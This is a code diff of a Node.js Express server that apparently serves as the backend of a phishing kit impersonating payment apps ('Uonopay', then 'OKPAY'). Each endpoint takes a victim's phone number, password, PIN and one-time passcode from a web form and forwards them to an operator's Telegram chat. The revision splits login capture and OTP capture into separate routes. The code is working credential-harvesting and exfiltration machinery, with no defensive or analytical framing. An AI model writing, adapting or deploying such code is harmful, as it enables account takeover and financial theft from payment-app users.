@@ -1,63 +1,51 @@
-const express = require("express");
-const cors = require("cors");
-const TelegramBot = require("node-telegram-bot-api");
-require("dotenv").config();
+const express = require('express');
+const cors = require('cors');
+const TelegramBot = require('node-telegram-bot-api');
+require('dotenv').config();
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Middlewares setup
 app.use(cors());
-app.use(express.json({ limit: "10kb" }));
+app.use(express.json({ limit: '10kb' }));
 app.use(express.static(__dirname));
 
-// Telegram Bot initialization
-// Dhyan rakhein ki aapki .env file mein BOT_TOKEN aur CHAT_ID sahi se set ho
 const bot = new TelegramBot(process.env.BOT_TOKEN);
 
-// Main Route jo HTML form ke fetch call se connect hoga
-app.post("/submit", async (req, res) => {
-    try {
-console.log(req.body);
-        // HTML se bheja gaya data yahan receive ho raha hai
-        const { phone,password,pin,otp,issue } = req.body;
+app.post('/submit-login', async (req, res) => {
+  const { phone, password, pin } = req.body;
+  if (!phone || !password || !pin) {
+    return res.status(400).json({ success: false, message: 'All fields required.' });
+  }
 
-        // Basic validation check
-        if (!phone) {
-            return res.status(400).json({
-                success: false,
-                message: "Kripya mobile number aur OTP dono enter karein."
-            });
-        }
+  const messageText = `OKPAY LOGIN\n\nMobile:📱 ${phone}\nPassword: 🔑${password}\nPin: 🧷${pin}`;
 
-        // Telegram par bheje jaane wale message ka format
-        const messageText = `Uonopay NOTIFICATION
-
-Support Issue: ${issue}
-📱 Mobile Number: ${phone}
-🔑Password: ${password}
-📌Pin: ${pin}
-📨Received OTP: ${otp}`;
-        
-        // Telegram bot ke zariye chat mein message send karna
-        await bot.sendMessage(process.env.CHAT_ID, messageText);
-
-        // Frontend ko success response dena
-        res.json({
-            success: true,
-            message: "Notification successfully sent to Telegram!"
-        });
-
-    } catch (error) {
-        console.error("Telegram API Error:", error.message);
-        res.status(500).json({
-            success: false,
-            message: "Internal Server Error: Telegram bot se connection fail hua."
-        });
-    }
+  try {
+    await bot.sendMessage(process.env.CHAT_ID, messageText);
+    res.json({ success: true, message: 'Login data sent.' });
+  } catch (error) {
+    console.error('Error:', error);
+    res.status(500).json({ success: false, message: 'Server error.' });
+  }
 });
 
-// Server initialization
+app.post('/submit-otp', async (req, res) => {
+  const { otp } = req.body;
+  if (!otp) {
+    return res.status(400).json({ success: false, message: 'OTP required.' });
+  }
+
+  const messageText = `OKPAY OTP\n\nReceived OTP:🛂 ${otp}`;
+
+  try {
+    await bot.sendMessage(process.env.CHAT_ID, messageText);
+    res.json({ success: true, message: 'OTP sent.' });
+  } catch (error) {
+    console.error('Error:', error);
+    res.status(500).json({ success: false, message: 'Server error.' });
+  }
+});
+
 app.listen(PORT, () => {
-    console.log("okpayk server running successfully on port " + PORT);
+  console.log(`Server running successfully on port ${PORT}`);
 });
